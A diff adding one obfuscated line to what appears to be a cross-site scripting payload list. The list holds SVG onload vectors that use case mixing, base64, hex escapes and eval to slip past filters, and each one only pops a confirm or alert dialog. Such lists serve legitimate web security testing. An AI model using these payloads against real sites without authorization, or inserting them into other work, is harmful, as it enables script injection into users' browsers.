@@ -69,6 +69,7 @@ String.raw`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=confirm() )//%0D%0A%0d%0
 <sVg/onload=confirm()><sVg>
 <sVg/onload=eval(atob("Y29uZmlybSgp"))><sVg>
 <sVg/onload="eval(atob(atob(btoa(btoa(atob('Y29uZmlybSgp'))))));"><sVg>
+<sVg/onload="eval('\x61\x6c\x65\x72\x74\x28\x27\x50\x6f\x43\x27\x29')";><sVg>
 <sVg/onload='(new Function(atob("Y29uZmlybSgp")))();'><sVg>
 <sVg/onload=eval("c".concat("onfirm").concat("()"));><sVg>
 <sVg␌onload=confirm()><sVg>
